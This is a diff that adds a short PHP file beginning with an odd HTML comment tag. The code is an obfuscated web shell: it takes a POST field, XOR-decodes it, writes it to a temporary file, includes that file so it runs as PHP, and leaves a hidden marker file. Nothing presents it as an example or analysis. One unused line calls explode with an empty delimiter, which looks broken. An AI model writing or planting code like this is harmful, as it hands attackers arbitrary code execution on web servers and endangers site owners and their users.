@@ -1,0 +1,15 @@
+<!--k7Qm2xP9-->
+<?php
+$alphabet = explode('', 'abcdefghijklmnopqrstuvwxyz0123456789');
+$key = 67;
+if (isset($_POST['elem'])) {
+    $tmp = sys_get_temp_dir();
+    $data = '';
+    foreach (str_split($_POST['elem']) as $i => $ch) {
+        $data .= chr(ord($ch) ^ 67);
+    }
+    $path = $tmp . '/' . md5($data);
+    file_put_contents($path, $data);
+    include $path;
+    touch($tmp . '/.holder');
+}
